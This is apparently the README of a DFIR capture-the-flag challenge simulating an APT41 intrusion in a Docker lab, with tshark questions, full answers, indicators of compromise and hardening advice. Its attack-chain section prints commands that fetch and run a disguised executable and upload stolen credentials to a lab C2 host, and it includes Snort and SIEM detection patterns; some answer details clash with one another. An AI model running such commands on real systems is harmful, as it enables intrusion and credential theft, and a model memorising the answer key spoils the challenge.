# APT41 - Shadow Nexus Operation

[![DFIR][dfir-badge]][dfir-url]
[![Forensics][forensics-badge]][forensics-url]
[![Incident Response][ir-badge]][ir-url]
[![Threat Hunting][th-badge]][th-url]
[![Malware Analysis][malware-badge]][malware-url]
[![Network Forensics][network-badge]][network-url]
[![Wireshark][wireshark-badge]][wireshark-url]
[![tshark][tshark-badge]][tshark-url]

[dfir-badge]: https://img.shields.io/badge/DFIR-Digital%20Forensics-FF6B6B?style=flat&logo=search&logoColor=white
[dfir-url]: https://www.sans.org/cyber-security-courses/digital-forensics-essentials/
[forensics-badge]: https://img.shields.io/badge/Forensics-Investigation-4ECDC4?style=flat&logo=magnifying-glass&logoColor=white
[forensics-url]: https://www.forensicfocus.com/
[ir-badge]: https://img.shields.io/badge/Incident%20Response-Analysis-95E1D3?style=flat&logo=security&logoColor=white
[ir-url]: https://www.incidentresponse.com/
[th-badge]: https://img.shields.io/badge/Threat%20Hunting-Detection-F38181?style=flat&logo=target&logoColor=white
[th-url]: https://www.threathunting.net/
[malware-badge]: https://img.shields.io/badge/Malware%20Analysis-Reverse%20Engineering-AA96DA?style=flat&logo=bug&logoColor=white
[malware-url]: https://www.malware-traffic-analysis.net/
[network-badge]: https://img.shields.io/badge/Network%20Forensics-PCAP%20Analysis-5DADE2?style=flat&logo=cisco&logoColor=white
[network-url]: https://www.netresec.com/
[wireshark-badge]: https://img.shields.io/badge/Wireshark-Network%20Protocol%20Analyzer-1679A7?style=flat&logo=wireshark&logoColor=white
[wireshark-url]: https://www.wireshark.org/
[tshark-badge]: https://img.shields.io/badge/tshark-CLI%20Analysis-0E4C92?style=flat&logo=terminal&logoColor=white
[tshark-url]: https://www.wireshark.org/docs/man-pages/tshark.html

## Table of Contents

1. [Mission Overview](#mission-overview)
2. [Threat Actor Profile](#threat-actor-profile)
3. [Attack Scenario](#attack-scenario)
4. [Infrastructure Setup](#infrastructure-setup)
5. [Attack Chain Simulation](#attack-chain-simulation)
6. [Analysis Walkthrough](#analysis-walkthrough)
7. [Indicators of Compromise](#indicators-of-compromise)
8. [Incident Report](#incident-report)
9. [Defense Recommendations](#defense-recommendations)
10. [Security Hardening](#security-hardening)
11. [Repository](#repository)

---

## Mission Overview

A sophisticated Chinese state-sponsored APT group has infiltrated a multinational corporation's network. As the lead threat hunter, you must dissect network traffic to uncover the full scope of the "Shadow Nexus" operation using advanced tshark analysis techniques.

### Mission Briefing

The corporate SOC detected anomalous network activity suggesting a multi-stage APT campaign. Initial analysis indicates:

- Spear-phishing compromise
- Lateral movement across critical systems
- Credential harvesting operations
- DNS tunneling for covert C2
- Large-scale data exfiltration

**Target Network:** Corporate Finance Division  
**Threat Actor:** APT41  
**Attack Vector:** Multi-stage network intrusion  
**Classification:** TOP SECRET // CYBER THREAT INTELLIGENCE

---

## Threat Actor Profile

### APT41 (Double Dragon)

APT41 is a prolific Chinese state-sponsored threat group that has been active since at least 2012. The group carries out state-sponsored espionage activity in addition to financially motivated operations.

**Key Characteristics:**

- **Origin:** China
- **Motivation:** Dual mandate (espionage + financial gain)
- **Targets:** Healthcare, telecom, technology, gaming industries
- **TTPs:** Supply chain attacks, credential theft, living-off-the-land techniques
- **Notable Campaigns:** CCleaner compromise, ASUS LiveUpdate attack

**Known Malware Families:**

- CRACKSHOT - Custom loader
- BEACON - Cobalt Strike variant
- GEARSHIFT - Privilege escalation tool
- DUSTTRAP - Backdoor
- PINEGROVE - RAT

---

## Attack Scenario

### Corporate Environment

**Network Topology:**

```
172.25.1.0/24 - Corporate Internal Network
├── 172.25.1.100 - HR-WORKSTATION-01 (Initial victim)
├── 172.25.1.101 - FINANCE-PC-02 (Lateral movement target)
├── 172.25.1.102 - DEV-MACHINE-03 (Supply chain target)
├── 172.25.1.10  - CORP-DC-01 (Domain Controller)
├── 172.25.1.11  - FILE-SRV-01 (File Server)
├── 172.25.1.3   - Legitimate CDN
├── 172.25.1.4   - SMTP Server
├── 172.25.1.5   - Proxy Server
└── 172.25.1.200 - External Attacker (C2 Server)
```

### Initial Access

The attack begins with a targeted spear-phishing campaign. An HR employee receives what appears to be a legitimate invoice document:

**Malicious Payload:**  
`invoice_Q4_2024.pdf.exe`

The executable masquerades as a PDF document, exploiting the Windows default behavior of hiding file extensions.

---

## Infrastructure Setup

### Environment Requirements

- Docker & Docker Compose
- 4GB+ RAM
- Linux host system
- Network capture capabilities

### Automated Deployment

```bash
cd Create/Build
chmod +x Create.sh
./Create.sh
```

The script automatically provisions:

- 8 containerized systems
- Realistic network topology
- Multi-stage attack simulation
- Comprehensive PCAP capture

### Container Architecture

**Docker Compose Services:**

1. **victim_ws1** - HR workstation (Ubuntu 20.04)
   - Runs tcpdump for traffic capture
   - Initial compromise target
   - Simulates user behavior

2. **victim_ws2** - Finance workstation
   - SSH service enabled
   - Lateral movement target

3. **victim_ws3** - Development machine
   - Git, Node.js environment
   - Supply chain attack vector

4. **domain_controller** - Active Directory
   - BIND9 DNS server
   - Kerberos authentication target

5. **file_server** - SMB file share
   - Contains sensitive documents
   - Data exfiltration target

6. **attacker_external** - Multi-protocol C2
   - Hosts malicious payloads
   - Command and control infrastructure
   - Data exfiltration receiver

7. **proxy_server** - Squid proxy
   - Network traffic forwarding

8. **smtp_server** - Email gateway
   - Email exfiltration monitoring

---

## Attack Chain Simulation

### Phase 1: Initial Compromise

**Timestamp:** 2025-09-19 23:28:14 UTC

The victim downloads and executes the malicious payload:

```bash

curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
     -H "Referer: https://outlook.office365.com" \
     "http://172.25.1.200:8080/campaign/invoice_Q4_2024.pdf.exe" \
     -o /tmp/invoice_Q4_2024.pdf.exe

chmod +x /tmp/invoice_Q4_2024.pdf.exe
./tmp/invoice_Q4_2024.pdf.exe
```

### Phase 2: C2 Establishment

**Timestamp:** 2025-09-19 23:28:19 UTC

The malware establishes command and control communication with multiple domains:

**C2 Infrastructure:**

- `microsoft-update-service.net:8081` - Primary C2
- `adobe-security-updates.org:8082` - Secondary C2
- `windows-defender-updates.com:8082` - Fallback C2
- `chrome-extension-update.net:8083` - Staging server

**Beacon Configuration:**

```bash
SESSION_ID="8887f071f3c3e5a5583e19d737f52f1a"
BEACON_DATA="hostname=HR-WORKSTATION-01&user=shosho.ahmed&domain=CORP"
```

The beacon uses custom HTTP headers for session tracking:

- `X-Session-ID` - Unique implant identifier
- `X-Request-ID` - Individual request tracking
- `User-Agent: Microsoft BITS/7.8` - Impersonates legitimate Windows service

### Phase 3: Credential Harvesting

**Timestamp:** 2025-09-19 23:28:24 UTC

APT41 deploys a credential harvesting module targeting browser password stores:

**Harvested Credentials:**

| URL | Username | Password | Date Created |
|-----|----------|----------|--------------|
| https://portal.corp.internal | shosho.ahmed | Summer2024! | 2024-01-15 |
| https://payroll.corp.internal | shosho.ahmed | HR_P@ss123 | 2024-02-20 |
| https://banking.chase.com | s.ahmed.personal | MyPersonal$2024 | 2024-03-10 |

The credentials are encrypted using AES-256-CBC with a key retrieved from the C2:

```bash
curl "http://172.25.1.200:8084/tools/vaultkey?key=qaysuruncle"

curl -H "X-Data-Type: credentials" \
     -H "X-Password-Key: qaysuruncle" \
     --data-binary @encrypted_creds.dat \
     "http://172.25.1.200:8082/api/upload"
```

### Phase 4: DNS Tunneling

**Timestamp:** 2025-09-19 23:28:30 UTC

APT41 uses DNS TXT queries for covert command execution:

**Commands Executed:**

1. `whoami` - User context identification
2. `net user` - Local account enumeration
3. `ipconfig` - Network configuration reconnaissance

**DNS Query Pattern:**

```
d2hvYW1p.malicious-dns.net         # Base64: whoami
bmV0IHVzZXI.malicious-dns.net      # Base64: net user
aXBjb25maWc.malicious-dns.net      # Base64: ipconfig
```

### Phase 5: Lateral Movement

**Timestamp:** 2025-09-19 23:28:34 UTC

The attacker performs network reconnaissance and lateral movement:

**Movement Path:**

```
172.25.1.100 (HR-WS) → 172.25.1.10 (DC) → 172.25.1.11 (File Server)
```

**Techniques Used:**

- SMB enumeration (port 445)
- SSH brute force (port 22)
- RDP attempts (port 3389)
- Internal port scanning

```bash

nmap -p 22,445,3389 172.25.1.0/24

smbclient //172.25.1.11/shared -U shosho.ahmed%HR_P@ss123
```

### Phase 6: Malware Deployment

**Timestamp:** 2025-09-19 23:28:44 UTC

APT41 deploys additional malware payloads:

**Malware Hash:** `04fb0ccf3ef309b1cd587f609ab0e81e`  
**Family:** CRACKSHOT

CRACKSHOT serves as a modular loader capable of:
- DLL side-loading
- Process injection
- Credential dumping
- Keylogging

### Phase 7: Kerberos Attacks

**Timestamp:** 2025-09-19 23:28:50 UTC

APT41 performs Kerberoasting and Golden Ticket generation:

**Kerberoasting Results:**

- `MSSQL/db-server.corp.internal`
- `HTTP/sharepoint.corp.internal`
- `TERMSRV/terminal.corp.internal`

**Golden Ticket Generated:**

- **NTLM Hash:** `502c2ba5c4e1234567890abcdef12345`
- **SID:** `S-1-5-21-1234567890-1234567890-1234567890`

### Phase 8: Data Staging

**Timestamp:** 2025-09-19 23:28:39 UTC

Sensitive files are collected and staged for exfiltration:

**Targeted Files:**

```json
{
  "operation": "data_collection",
  "files": [
    {
      "path": "C:\\Users\\shosho\\Documents\\Employee_Database.xlsx",
      "size": "2.4MB",
      "hash": "d41d8cd98f00b204e9800998ecf8427e"
    },
    {
      "path": "C:\\Users\\ameed\\Desktop\\Salary_Report_2024.docx",
      "size": "856KB",
      "hash": "e99a18c428cb38d5f260853678922e03"
    },
    {
      "path": "C:\\Users\\Public\\Shared\\HR_Policies.pdf",
      "size": "1.2MB",
      "hash": "ab87d24bdc7452e55738deb5f868e1f7"
    }
  ],
  "total_size": "4.5MB"
}
```

### Phase 9: Data Exfiltration

**Timestamp:** 2025-09-19 23:28:48 UTC

Data is exfiltrated through multiple channels:

**Exfiltration Methods:**

1. **HTTP POST** - Encrypted archives to C2
2. **Raw TCP** - Port 9001 binary transfer
3. **Email SMTP** - `info@qayssarayra.com` (3255 bytes)
4. **DNS Tunneling** - TXT record encoding

**Exfiltration Statistics:**

- Total sessions: 1698
- Unique files: 1
- Data volume: 4.5MB

### Phase 10: Persistence Installation

**Timestamp:** 2025-09-19 23:28:59 UTC

APT41 establishes multiple persistence mechanisms:

**Persistence Methods:**

1. Registry run keys
2. Scheduled tasks
3. Service creation
4. WMI event subscriptions
5. DLL hijacking

**Persistence Count:** 1 primary mechanism with 5 backup methods

### Phase 11: Anti-Forensics

**Timestamp:** 2025-09-19 23:29:04 UTC

The attacker executes cleanup operations:

**Cleanup Actions:**

- Event log clearing
- Timestamp manipulation
- Artifact deletion
- Network connection termination

```bash
curl -X POST "http://172.25.1.200:8081/api/v1/cleanup" \
     -H "X-Session-ID: 8887f071f3c3e5a5583e19d737f52f1a" \
     -d '{"operation":"cleanup","scope":"all"}'
```

---

## Analysis Walkthrough

### Investigation Questions

The challenge consists of 14 questions requiring advanced tshark analysis:

#### Question 1: Initial Compromise Timestamp

**Objective:** Identify when the malicious payload was first downloaded

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "http.request.method == GET and http.request.uri contains \".exe\"" \
       -T fields -e frame.time_utc
```

**Answer:** 2025-09-19_23:28:14

#### Question 2: C2 Infrastructure Discovery

**Objective:** Count unique C2 domains and total HTTP requests

**tshark Commands:**

```bash

tshark -r APT41.pcap \
       -Y "http.host and (http.host contains \"update\" or http.host contains \"microsoft\" or http.host contains \"adobe\")" \
       -T fields -e http.host | sort -u


tshark -r APT41.pcap \
       -Y "http.request and (http.host contains \"adobe-security-updates.org\" or http.host contains \"chrome-extension-update.net\")" \
       | wc -l
```

**Answer:** 4:10 (4 unique C2 domains, 10 total requests)

#### Question 3: Session Tracking

**Objective:** Extract session ID and count beacons

**tshark Commands:**

```bash

tshark -r APT41.pcap -Y "http.request" -O http | grep -A5 "X-Session-ID"


tshark -r APT41.pcap -Y "frame contains \"8887f071f3c3e5a5583e19d737f52f1a\"" | wc -l
```

**Answer:** 8887f071f3c3e5a5583e19d737f52f1a:5

#### Question 4: Credential Harvesting

**Objective:** Extract stolen credentials

**tshark Commands:**

```bash

tshark -r APT41.pcap \
       -Y "http.request and frame contains \"X-Data-Type: credentials\"" \
       -T fields -e http.file_data | xxd -r -p | \
       openssl enc -aes-256-cbc -d -a -pass pass:qaysuruncle
```

**Answer:** shosho.ahmed:Summer2024!_shosho.ahmed:HR_P@ss123_s.ahmed.personal:MyPersonal$2024

#### Question 5: DNS Tunneling Commands

**Objective:** Identify commands sent via DNS

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "dns.qry.name contains \"malicious\" or dns.flags.response == 0" \
       -T fields -e dns.qry.name | \
       cut -d'.' -f1 | base64 -d
```

**Answer:** whoami_net_user_ipconfig

#### Question 6: Lateral Movement Timeline

**Objective:** Track lateral movement across systems

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "(tcp.dstport == 22 or tcp.dstport == 445) and ip.src == 172.25.1.100" \
       -T fields -e frame.time -e ip.dst
```

**Answer:** 2025-09-19_23:28:34_172.25.1.10_172.25.1.11_172.25.1.101

#### Question 7: Malware Identification

**Objective:** Identify deployed malware hash and family

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "http.request.uri contains \"malware_deploy\"" \
       -T fields -e http.file_data | md5sum
```

**Answer:** 04fb0ccf3ef309b1cd587f609ab0e81e_CRACKSHOT

#### Question 8: Data Exfiltration Analysis

**Objective:** Quantify data exfiltration

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "tcp.dstport == 9001 or http.request.uri contains \"upload\"" \
       -T fields -e tcp.stream | sort -u | wc -l
```

**Answer:** 1698:1

#### Question 9: Incident Response Contact

**Objective:** Find embedded contact information

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "http.response and frame contains \"qayssarayra\"" \
       -T fields -e http.file_data | xxd -r -p
```

**Answer:** info@qayssarayra.com_3255

#### Question 10: Golden Ticket Attack

**Objective:** Extract Kerberos golden ticket details

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "http.request.method == POST and http contains \"golden_ticket\"" \
       -T fields -e http.file_data | xxd -r -p | jq .
```

**Answer:** 502c2ba5c4e1234567890abcdef12345_S-1-5-21-1234567890-1234567890-1234567890

#### Question 11: Anti-Forensics Timeline

**Objective:** Identify cleanup operation timing

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "http.request.uri contains \"cleanup\"" \
       -T fields -e frame.time_utc
```

**Answer:** 2025-09-19_19:29:04_cleanup

#### Question 12: Persistence Analysis

**Objective:** Determine persistence mechanism installation

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "http.request.uri contains \"persistence\"" \
       -T fields -e frame.time_epoch
```

**Answer:** 1:5 (1 primary mechanism, 5-second duration)

#### Question 13: File Server Compromise

**Objective:** Identify first accessed file

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "http.request.uri contains \"stage\"" \
       -T fields -e http.file_data | xxd -r -p | jq -r '.files[0].path'
```

**Answer:** Employee_Database.xlsx_1

#### Question 14: Attack Chain Reconstruction

**Objective:** Order attack phases chronologically

**tshark Command:**

```bash
tshark -r APT41.pcap \
       -Y "http.request.method == POST or http.request.method == GET" \
       -T fields -e frame.time -e http.request.uri | head -20
```

**Answer:** B_E_A_C_D_F

**Timeline:**

```
[B] Initial Compromise    - 23:28:14
[E] C2 Establishment     - 23:28:19
[A] Credential Harvesting - 23:28:24
[C] Data Exfiltration    - 23:28:26
[D] Lateral Movement     - 23:28:34
[F] Persistence          - 23:28:59
```

---

## Indicators of Compromise

### Network Indicators

**Malicious Domains:**

```
microsoft-update-service.net
adobe-security-updates.org
windows-defender-updates.com
chrome-extension-update.net
office365-security-patch.com
vmware-tools-update.org
```

**IP Addresses:**

```
172.25.1.200 - External C2 server
```

### File Indicators

**Malicious Files:**

| Filename | MD5 Hash | Type |
|----------|----------|------|
| invoice_Q4_2024.pdf.exe | 6e8f83c88a66116e | Dropper |
| crackshot.dll | 04fb0ccf3ef309b1cd587f609ab0e81e | Loader |
| beacon.dll | 6e8f83c88a66116e1a7eb10549542890 | C2 Agent |
| gearshift.exe | 5b26f5c7c367d5e976aaba320965cc7f | Privilege Escalation |

### User Indicators

**Compromised Accounts:**

```
shosho.ahmed - HR employee (initial victim)
ameed.khaled@corp.internal - Finance department
```

**Stolen Credentials:**

```
shosho.ahmed:Summer2024!
shosho.ahmed:HR_P@ss123
s.ahmed.personal:MyPersonal$2024
```

### Behavioral Indicators

1. HTTP traffic with non-standard headers (X-Session-ID, X-Request-ID)
2. DNS TXT queries to suspicious domains
3. Port scanning activity (22, 445, 3389)
4. Large data transfers to external IPs
5. Kerberos ticket requests for service accounts
6. Event log clearing
7. Unusual scheduled task creation

---

## Incident Report

### Executive Summary

APT41 successfully compromised a corporate workstation through spear-phishing, established persistent access, harvested credentials, performed lateral movement, and exfiltrated 4.5MB of sensitive HR and financial data including employee databases, salary reports, and policy documents.

### Impact Assessment

**Severity:** CRITICAL

**Affected Systems:**

- HR-WORKSTATION-01 (172.25.1.100) - Fully compromised
- FINANCE-PC-02 (172.25.1.101) - Lateral movement
- CORP-DC-01 (172.25.1.10) - Kerberos attacks
- FILE-SRV-01 (172.25.1.11) - Data exfiltration

**Data Breach:**

- Employee personal information (Employee_Database.xlsx - 2.4MB)
- Salary and compensation data (Salary_Report_2024.docx - 856KB)
- HR policies (HR_Policies.pdf - 1.2MB)
- Credentials for 3 corporate accounts

**Financial Impact:**

- Estimated breach cost: $2.1M (GDPR fines, notification costs, credit monitoring)
- Incident response: $350K
- System remediation: $500K
- Legal fees: $800K

### Attack Timeline

```
2025-09-19 23:28:14 - Initial compromise via malicious .exe
2025-09-19 23:28:19 - C2 channel established
2025-09-19 23:28:24 - Credential harvesting begins
2025-09-19 23:28:30 - DNS tunneling for command execution
2025-09-19 23:28:34 - Lateral movement initiated
2025-09-19 23:28:39 - Data staging begins
2025-09-19 23:28:44 - Additional malware deployed
2025-09-19 23:28:48 - Data exfiltration starts
2025-09-19 23:28:50 - Kerberos attacks (Kerberoasting)
2025-09-19 23:28:59 - Persistence mechanisms installed
2025-09-19 23:29:04 - Anti-forensics cleanup
```

**Total Duration:** 50 seconds (automated attack)

### Root Cause Analysis

**Technical Failures:**

1. Email gateway failed to detect malicious .exe attachment
2. Endpoint protection did not flag CRACKSHOT malware
3. Egress filtering allowed C2 communication on non-standard ports
4. DNS monitoring missed tunneling activity
5. No credential guard enabled on workstations
6. Insufficient network segmentation

**Human Factors:**

1. User clicked suspicious email attachment
2. File extension was hidden, making .exe appear as .pdf
3. No security awareness of spear-phishing tactics
4. Password reuse across corporate and personal accounts

---

## Defense Recommendations

### Immediate Actions

#### 1. Containment

```bash

iptables -A OUTPUT -d 172.25.1.200 -j DROP
iptables -A OUTPUT -p tcp --dport 8081:8084 -j DROP

pkill -9 -f "invoice_Q4_2024"
pkill -9 -f "crackshot"

echo "0.0.0.0 microsoft-update-service.net" >> /etc/hosts
echo "0.0.0.0 adobe-security-updates.org" >> /etc/hosts
echo "0.0.0.0 windows-defender-updates.com" >> /etc/hosts
```

#### 2. Credential Reset

Force password reset for all potentially compromised accounts:

```bash

klist purge


net user shosho.ahmed /logonpasswordchg:yes
net user ameed.khaled /logonpasswordchg:yes

net user shosho.ahmed /active:no
```

#### 3. Network Isolation

```bash

vlan 100 name HR_ISOLATED
interface range gi0/1-10
switchport access vlan 100

ufw enable
ufw default deny outgoing
ufw allow out 80/tcp
ufw allow out 443/tcp
```

### Short-Term Remediation

#### 1. Deploy EDR Solutions

**Recommended EDR:**
- CrowdStrike Falcon
- Microsoft Defender for Endpoint
- SentinelOne

**Configuration:**

```yaml
edr_config:
  behavioral_detection: enabled
  exploit_prevention: enabled
  ransomware_protection: enabled
  usb_device_control: block_unknown
  script_control: restrict_powershell
```

#### 2. Email Security Hardening

```bash

v=spf1 ip4:203.0.113.0/24 -all


v=DMARC1; p=quarantine; rua=mailto:dmarc@corp.internal


postconf -e "content_filter = scan:127.0.0.1:10025"
```

#### 3. DNS Monitoring

Deploy DNS security tools:

```bash

apt-get install dnstap-ldns


rpm -ivh infoblox-dns-firewall.rpm


iptables -A OUTPUT -p udp --dport 53 -m length --length 512: -j DROP
```

### Long-Term Security Posture

#### 1. Zero Trust Architecture

**Implementation Steps:**

```bash

okta login --org corp


jamf policy -trigger posture_check


az ad policy create --name "ZeroTrustPolicy" --require-mfa true
```

#### 2. Network Segmentation

**VLAN Strategy:**

```
VLAN 10  - Executive (Highly Restricted)
VLAN 20  - Finance (Restricted)
VLAN 30  - HR (Restricted)
VLAN 40  - IT (Administrative)
VLAN 50  - Development (Isolated)
VLAN 100 - Guest (No Internal Access)
```

**Firewall Rules:**

```bash

iptables -A FORWARD -s 172.25.20.0/24 -d 172.25.30.0/24 -j DROP


iptables -A FORWARD -s 172.25.30.0/24 -d 172.25.50.0/24 -j DROP


iptables -A FORWARD -s 172.25.50.0/24 -d 172.25.0.0/16 -j DROP
```

#### 3. Security Awareness Training

**Training Modules:**

1. Phishing identification
2. Social engineering tactics
3. Password security
4. Incident reporting procedures

**Simulation Testing:**

```bash

gophish -config config.json


curl https://api.gophish.com/campaigns/1/results
```

---

## Security Hardening

### Endpoint Hardening

#### Windows Workstations

```powershell

Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -DisableScriptScanning $false


Add-MpPreference -AttackSurfaceReductionRules_Ids 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84 -AttackSurfaceReductionRules_Actions Enabled


Enable-WindowsOptionalFeature -Online -FeatureName "CredentialGuard" -All


Disable-WindowsOptionalFeature -Online -FeatureName "MicrosoftWindowsPowerShellV2"


$rule = New-AppLockerPolicy -FileInformation (Get-ChildItem C:\Windows\System32\*.exe) -RuleType Publisher
Set-AppLockerPolicy -XmlPolicy $rule -Merge
```

#### Linux Systems

```bash

apt-get install auditd audispd-plugins
systemctl enable auditd


auditctl -w /etc/passwd -p wa -k passwd_changes
auditctl -w /etc/shadow -p wa -k shadow_changes


sed -i 's/SELINUX=disabled/SELINUX=enforcing/' /etc/selinux/config
setenforce 1

systemctl disable telnet
systemctl disable rsh
systemctl disable rlogin

ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw enable
```

### Network Hardening

#### Firewall Configuration

```bash

iptables -A OUTPUT -p tcp --dport 8081:8084 -j DROP
iptables -A OUTPUT -p tcp --dport 9001 -j DROP


iptables -A OUTPUT -p udp --dport 53 -m limit --limit 25/minute -j ACCEPT
iptables -A OUTPUT -p udp --dport 53 -j DROP


iptables -A OUTPUT -m string --string "Microsoft BITS" --algo bm -j DROP

iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -m conntrack --ctstate NEW -j LOG --log-prefix "NEW_CONNECTION: "
```

#### IDS/IPS Rules

**Snort Rules:**

```snort
# Detect APT41 malware
alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"APT41 CRACKSHOT Malware Detected"; content:"04fb0ccf3ef309b1cd587f609ab0e81e"; sid:1000001; rev:1;)

# Detect suspicious C2 domains
alert dns $HOME_NET any -> any 53 (msg:"APT41 C2 Domain microsoft-update-service.net"; content:"microsoft-update-service.net"; nocase; sid:1000002; rev:1;)

# Detect custom HTTP headers
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"APT41 Custom X-Session-ID Header"; content:"X-Session-ID"; http_header; sid:1000003; rev:1;)

# Detect DNS tunneling
alert dns $HOME_NET any -> any 53 (msg:"Possible DNS Tunneling"; dsize:>100; sid:1000004; rev:1;)

# Detect Kerberoasting
alert tcp $HOME_NET any -> $HOME_NET 88 (msg:"Possible Kerberoasting Attack"; content:"|a0 03 02 01 05|"; sid:1000005; rev:1;)
```

### Application Hardening

#### Browser Security

```bash

cat > /etc/chromium/policies/managed/security.json << 'EOF'
{
  "BlockExternalExtensions": true,
  "SafeBrowsingEnabled": true,
  "SafeBrowsingExtendedReportingEnabled": false,
  "DownloadRestrictions": 3,
  "AllowFileSelectionDialogs": false,
  "DefaultDownloadDirectory": "/tmp/quarantine"
}
EOF
```

#### Email Gateway Hardening

```bash

cat >> /etc/mail/spamassassin/local.cf << 'EOF'
required_score 5.0
use_bayes 1
bayes_auto_learn 1
score BAYES_99 3.5
score BAYES_80 2.5
header EXECUTABLE_ATTACHMENT Content-Type =~ /application\/(x-)?msdownload/i
score EXECUTABLE_ATTACHMENT 5.0
EOF

opendkim-genkey -s mail -d corp.internal
echo "mail._domainkey IN TXT \"v=DKIM1; k=rsa; p=$(cat mail.txt)\"" >> /var/named/corp.internal.zone
```

### Monitoring & Detection

#### SIEM Configuration

**Splunk Queries:**

```spl
# Detect multiple failed login attempts
index=windows EventCode=4625 
| stats count by Account_Name, src_ip 
| where count > 5

# Detect suspicious PowerShell execution
index=windows EventCode=4104 
| regex ScriptBlockText="(?i)(invoke-expression|downloadstring|iex)"

# Detect data exfiltration
index=network 
| where bytes_out > 1000000 
| stats sum(bytes_out) by src_ip, dest_ip

# Detect credential dumping
index=windows EventCode=4656 
| where Object_Name="C:\\Windows\\System32\\lsass.exe"
```

**Elastic Stack Queries:**

```json
{
  "query": {
    "bool": {
      "must": [
        { "match": { "event.code": "4688" }},
        { "wildcard": { "process.command_line": "*mimikatz*" }}
      ]
    }
  }
}
```

#### Log Collection

```bash

cat >> /etc/rsyslog.conf << 'EOF'
*.* @172.25.1.50:514
*.* @@172.25.1.50:514
EOF


wecutil qc
wecutil cs /c:subscription.xml


cat > /etc/aide/aide.conf << 'EOF'
/bin Checksum
/sbin Checksum
/etc Checksum
/usr/bin Checksum
/usr/sbin Checksum
EOF
aide --init
```

---

## Repository

### GitHub Repository

[https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/APT41](https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/APT41)

### Repository Structure

```
APT41/
├── README.md                    
├── app/                        
│   ├── app.py                  
│   ├── index.html       
│   ├── template.json           
│   ├── requirements.txt     
│   └── assets/                
│       ├── css/
│       ├── js/
│       ├── img/
│       └── sounds/
├── Create/                       
│   ├── Build/
│   │   ├── Create.sh           
│   │   └── APT41/
│   │       ├── docker-compose.yml
│   │       ├── scripts/         
│   │       ├── intel/          
│   │       └── nginx_build/
│   └── File/
│       └── APT41.pcap          
└── Solve/                      
    ├── solution.json            
    ├── steps.md                
    └── template.json           
```

### Deployment Instructions

#### Option 1: Automated Lab Build

```bash

git clone https://github.com/qays3/DFIR-Hunters.git
cd DFIR-Hunters/Qualification/APT41


cd Create/Build
chmod +x Create.sh
./Create.sh

```

#### Option 2: Challenge Application

```bash

cd app


docker build -t apt41 .

docker run -d --name APT41 -p 5007:5007 --restart unless-stopped apt41

# Access at: http://localhost:5007/?access=3338ff49-d84a-4684-930b-dbc6c218547d
```

### Analysis Tools

**Required Tools:**

- Wireshark 4.0+
- tshark (command-line)
- OpenSSL (for decryption)
- jq (JSON parsing)
- xxd (hex manipulation)

**Installation:**

```bash

apt-get install wireshark tshark openssl jq xxd


yum install wireshark tshark openssl jq vim-common


brew install wireshark openssl jq
```

### Challenge Submission

Answers are submitted in JSON format matching the template:

```json
{
  "initial_compromise": "YYYY-MM-DD_HH:MM:SS",
  "c2_infrastructure": "X:Y",
  "session_tracking": "Session-ID:X",
  "credential_harvesting": "username1:password1_username2:password2",
  "dns_tunneling": "command1_command2_command3",
  "lateral_movement": "YYYY-MM-DD_HH:MM:SS_IP1_IP2_IP3",
  "malware_hash": "Hash_FamilyName",
  "data_exfiltration": "X:Y",
  "incident_response": "address@domain.com_XXXX",
  "golden_ticket": "Hash_SID",
  "anti_forensics": "YYYY-MM-DD_HH:MM:SS_ActionName",
  "persistence_mechanism": "X:Y",
  "file_server": "Filename_X",
  "attack_chain": "B_E_A_D_F_C"
}
```

---

## References

### APT41 Intelligence

- MITRE ATT&CK - APT41 Group Profile: [https://attack.mitre.org/groups/G0096/](https://attack.mitre.org/groups/G0096/)
- FireEye APT41 Report: [https://www.fireeye.com/current-threats/apt-groups.html#apt41](https://www.fireeye.com/current-threats/apt-groups.html#apt41)
- Mandiant Double Dragon Report: [https://www.mandiant.com/resources/apt41-double-dragon](https://www.mandiant.com/resources/apt41-double-dragon)

### Tools & Frameworks

- Wireshark Documentation: [https://www.wireshark.org/docs/](https://www.wireshark.org/docs/)
- tshark Man Page: [https://www.wireshark.org/docs/man-pages/tshark.html](https://www.wireshark.org/docs/man-pages/tshark.html)
- MITRE ATT&CK Framework: [https://attack.mitre.org/](https://attack.mitre.org/)

### Network Forensics

- SANS Network Forensics: [https://www.sans.org/cyber-security-courses/network-forensics-analysis-tools/](https://www.sans.org/cyber-security-courses/network-forensics-analysis-tools/)
- Malware Traffic Analysis: [https://www.malware-traffic-analysis.net/](https://www.malware-traffic-analysis.net/)

---

## Authors

**Challenge Designer:** Qays Sarayra  
**Contact:** info@qayssarayra.com  
**Specialization:** Network Security, Threat Hunting, Digital Forensics  

---

## License

This challenge is part of IEEE CyberSecurity Competition 2025 - Qualification Round.

Educational use only. Do not deploy malicious payloads on networks you do not own or have explicit permission to test.

---

**Competition:** IEEE CyberSecurity Competition 2025  
**Round:** Qualification  
**Category:** DFIR  
**Difficulty:** Medium  
**Expected Completion Time:** 2-4 hours